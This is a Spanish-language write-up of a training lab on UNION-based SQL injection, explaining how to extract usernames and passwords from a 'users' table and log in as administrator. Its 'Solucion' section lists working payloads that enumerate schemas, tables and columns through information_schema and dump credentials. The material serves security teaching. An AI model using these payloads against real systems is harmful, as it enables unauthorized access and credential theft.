En esta clase aplicamos de forma práctica todo lo aprendido en los labs anteriores sobre ataques UNION. El objetivo es utilizar una inyección SQL para extraer información de una tabla diferente: la tabla ‘**users**‘, que contiene columnas ‘**username**‘ y ‘**password**‘.

La vulnerabilidad sigue presente en el parámetro de categoría. Como los resultados de la consulta se muestran en la respuesta, es posible manipularla para que devuelva información sensible de otra tabla.

Los pasos clave son:

- Verificar cuántas columnas tiene la consulta original y cuáles aceptan texto, tal como se vio en los labs anteriores.
- Una vez identificado eso, se construye un payload que sustituye la consulta original por una que seleccione directamente los valores de las columnas ‘**username**‘ y ‘**password**‘ desde la tabla ‘**users**‘.
- Al inyectar correctamente la consulta, la respuesta mostrará las credenciales de todos los usuarios, incluida la del administrador.

Con esa información, simplemente accedemos al login de la aplicación, introducimos los datos del admin y completamos el laboratorio.

**Quédate con esto**: Los ataques UNION permiten acceder a información de tablas completamente distintas a la que consulta originalmente la aplicación, siempre que podamos controlar y visualizar parte de la respuesta. Aquí es donde una inyección SQL se convierte en una herramienta realmente poderosa.

Solucion
mas de lo mismo primeroorder by 
luego, ' union select NULL,schema_name from information_schema.schemata-- - 
Luego, ' union select NULL,table_name from information_schema.tables where table_schema='public'-- - 
Despues  ' union select NULL,schema_name from information_schema.schemata-- - 
Luego, ' union select NULL,table_name from information_schema.tables where table_schema='public'-- 
Luego ' union select NULL,column_name from information_schema.columns where table_schema='public' and table_name='users'--
Ultimo ' union select username,password from public.users-- -
Nos logeamos


